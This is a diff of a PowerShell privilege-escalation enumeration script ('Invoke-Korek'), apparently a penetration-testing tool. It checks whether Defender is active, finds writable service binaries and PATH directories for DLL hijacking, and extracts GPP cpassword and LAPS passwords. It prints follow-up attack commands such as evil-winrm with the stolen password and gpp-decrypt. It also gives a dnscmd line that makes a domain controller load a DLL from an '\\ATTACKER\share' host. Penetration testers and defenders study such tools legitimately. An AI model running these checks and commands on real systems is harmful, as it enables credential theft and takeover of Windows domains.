@@ -101,7 +101,7 @@ function Invoke-Korek {
                 }
             }
         }
-        if (-not $anyHot) { Info "No high-value token privileges — focus on service / cred checks below" }
+        if (-not $anyHot) { Info "No high-value token privileges - focus on service / cred checks below" }
     } catch { DBG "whoami /priv failed: $_" }
 
     # ------------------------------------------------------------------
@@ -111,8 +111,8 @@ function Invoke-Korek {
     try {
         $def = Get-MpComputerStatus -EA SilentlyContinue
         if ($def) {
-            if ($def.RealTimeProtectionEnabled) { Hit "Defender RealTime ON — obfuscate payloads" }
-            else { Info "Defender RealTime DISABLED — payload delivery easier" }
+            if ($def.RealTimeProtectionEnabled) { Hit "Defender RealTime ON - obfuscate payloads" }
+            else { Info "Defender RealTime DISABLED - payload delivery easier" }
             Info "IsTamperProtected: $($def.IsTamperProtected)"
         } else { Info "Cannot query Defender status" }
     } catch { DBG "Get-MpComputerStatus error: $_" }
@@ -127,7 +127,9 @@ function Invoke-Korek {
         Where-Object { $_.PathName -ne $null } |
         ForEach-Object {
             $svc  = $_
-            $path = ($svc.PathName -replace '^"([^"]+)".*', '$1').Trim()
+            $raw = $svc.PathName.Trim()
+            if ($raw.StartsWith('"')) { $path = $raw.Substring(1).Split('"')[0] }
+            else { $path = $raw.Split(' ')[0] }
             if (-not (Test-Path $path -EA SilentlyContinue)) { return }
             if (Test-Writable $path) {
                 Hot "WRITABLE SERVICE BINARY: '$($svc.Name)' -> $path"
@@ -191,13 +193,13 @@ function Invoke-Korek {
     # ------------------------------------------------------------------
     # WRITABLE PATH DIRECTORIES (DLL hijacking)
     # ------------------------------------------------------------------
-    Sec "WRITABLE PATH DIRECTORIES (DLL hijack — confirmed writable only)"
+    Sec "WRITABLE PATH DIRECTORIES (DLL hijack - confirmed writable only)"
     $pathCount = 0
     $env:PATH -split ';' | Where-Object { $_ -ne "" } | ForEach-Object {
         $dir = $_.Trim()
         if ((Test-Path $dir -EA SilentlyContinue) -and (Test-Writable $dir)) {
             Hot "WRITABLE PATH DIR: $dir"
-            Expl "Drop malicious DLL here — processes loading from PATH will pick it up"
+            Expl "Drop malicious DLL here - processes loading from PATH will pick it up"
             $pathCount++
         } else {
             DBG "PATH dir not writable (skipped): $dir"
@@ -206,9 +208,9 @@ function Invoke-Korek {
     if ($pathCount -eq 0) { Info "No writable PATH directories found" }
 
     # ------------------------------------------------------------------
-    # SCHEDULED TASKS (SYSTEM/HIGH — writable binary only)
+    # SCHEDULED TASKS (SYSTEM/HIGH - writable binary only)
     # ------------------------------------------------------------------
-    Sec "SCHEDULED TASKS (SYSTEM/HIGH — writable binary only)"
+    Sec "SCHEDULED TASKS (SYSTEM/HIGH - writable binary only)"
     try {
         $taskCount = 0
         Get-ScheduledTask -EA SilentlyContinue |
@@ -433,23 +435,14 @@ function Invoke-Korek {
     # ------------------------------------------------------------------
     # GPP PASSWORDS
     # ------------------------------------------------------------------
-    Sec "GPP PASSWORDS IN SYSVOL"
+    Sec "GPP PASSWORDS IN SYSVOL (AD)"
     if ($isDomain) {
-        try {
-            $sysvol = "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies"
-            if (Test-Path $sysvol -EA SilentlyContinue) {
-                Get-ChildItem $sysvol -Recurse -EA SilentlyContinue |
-                Where-Object { $_.Name -match "Groups|Services|ScheduledTasks|DataSources" -and $_.Name -match "\.xml$" } |
-                ForEach-Object {
-                    $c = Get-ContentSafe $_.FullName 50
-                    if ($c -match "cpassword") {
-                        Hot "GPP cpassword: $($_.FullName)"
-                        $c | Where-Object { $_ -match "cpassword" } | ForEach-Object { Info ">> $_" }
-                        Expl "gpp-decrypt <cpassword value>"
-                    }
-                }
-            }
-        } catch {}
+        Info "GPP check is AD-specific - use easyAD.ps1 for full coverage"
+        Info "Download: https://github.com/saitamang/easyAD"
+        Expl ". .\easyAD.ps1   # covers GPP + all AD attack paths"
+        Info "Quick manual check:"
+        Expl "findstr /S /I cpassword \\$env:USERDNSDOMAIN\sysvol\$env:USERDNSDOMAIN\policies\*.xml"
+        Expl "gpp-decrypt <cpassword_value>   # on Kali after extracting value"
     } else { Info "Not domain-joined; skipped" }
 
     # ------------------------------------------------------------------
@@ -479,22 +472,30 @@ function Invoke-Korek {
     Sec "SERVICES RUNNING AS DOMAIN USERS"
     if ($isDomain) {
         try {
-            Get-WmiObject Win32_Service -EA SilentlyContinue |
+            $domSvcs = Get-WmiObject Win32_Service -EA SilentlyContinue |
             Where-Object {
                 $_.StartName -notmatch "LocalSystem|LocalService|NetworkService|NT AUTHORITY|NT SERVICE" -and
                 $_.StartName -ne $null -and $_.StartName -ne ""
-            } | ForEach-Object {
-                Hit "Service '$($_.Name)' runs as: $($_.StartName)"
-                Info "Binary: $($_.PathName)"
-                Expl "If you own this user account -> service binary is privesc target"
             }
-        } catch {}
+            if ($domSvcs) {
+                $domSvcs | ForEach-Object {
+                    Hit "Service '$($_.Name)' runs as: $($_.StartName)"
+                    Info "Binary: $($_.PathName)"
+                    Info "If you crack or own this account -> service binary is a privesc target"
+                }
+            } else {
+                Info "No services running as domain users"
+            }
+        } catch { DBG "Service domain user check failed: $_" }
+        Info "For full AD lateral movement paths run easyAD.ps1:"
+        Info "  Download: https://github.com/saitamang/easyAD"
+        Expl ". .\easyAD.ps1"
     } else { Info "Not domain-joined; skipped" }
 
     # ------------------------------------------------------------------
     # LAPS
     # ------------------------------------------------------------------
-    Sec "LAPS SECRETS"
+    Sec "LAPS SECRETS (AD)"
     if ($isDomain) {
         try {
             $searcher = [ADSISearcher]"(ms-Mcs-AdmPwd=*)"
@@ -506,7 +507,13 @@ function Invoke-Korek {
                     Hot "LAPS PASSWORD for $comp : $pass"
                     Expl "evil-winrm -i $comp -u Administrator -p '$pass'"
                 }
-            } else { Info "LAPS not readable or not configured" }
+            } else {
+                Info "LAPS not readable (or not configured) from this account"
+                Info "For deeper AD enumeration including LAPS run easyAD.ps1:"
+                Info "  Download: https://github.com/saitamang/easyAD"
+                Expl ". .\easyAD.ps1"
+                Expl "nxc ldap DC_IP -u USER -p PASS --laps   # from Kali via easyAD.sh"
+            }
         } catch { Info "LAPS check failed (expected if no permissions)" }
     } else { Info "Not domain-joined; skipped" }
 
@@ -531,10 +538,18 @@ function Invoke-Korek {
             $groups = whoami /groups 2>$null
             if ($groups -match "DnsAdmins") {
                 Hot "USER IS IN DNSADMINS -> SYSTEM on DC!"
-                Expl "dnscmd DC01 /config /serverlevelplugindll \\ATTACKER\share\malicious.dll"
-                Expl "sc.exe \\DC01 stop dns && sc.exe \\DC01 start dns"
-            } else { Info "Not in DnsAdmins" }
-        } catch {}
+                Expl "dnscmd $env:USERDNSDOMAIN /config /serverlevelplugindll \\ATTACKER\share\malicious.dll"
+                Expl "sc.exe \\DC stop dns"
+                Expl "sc.exe \\DC start dns"
+                Info "easyAD.ps1 covers full AD privesc paths including DnsAdmins:"
+                Info "  Download: https://github.com/saitamang/easyAD"
+            } else {
+                Info "Not in DnsAdmins"
+                Info "Run easyAD.ps1 for full AD group/ACL enumeration:"
+                Info "  Download: https://github.com/saitamang/easyAD"
+                Expl ". .\easyAD.ps1"
+            }
+        } catch { DBG "DnsAdmins check failed: $_" }
     } else { Info "Not domain-joined; skipped" }
 
     # ------------------------------------------------------------------
@@ -607,7 +622,7 @@ function Invoke-Korek {
     if ($findings.Count -gt 0) {
         $findings | Select-Object -Unique | ForEach-Object { Log $_ }
     } else {
-        Info "No critical findings — try service misconfigs, unquoted paths, or scheduled tasks"
+        Info "No critical findings - try service misconfigs, unquoted paths, or scheduled tasks"
     }
 
     # ------------------------------------------------------------------
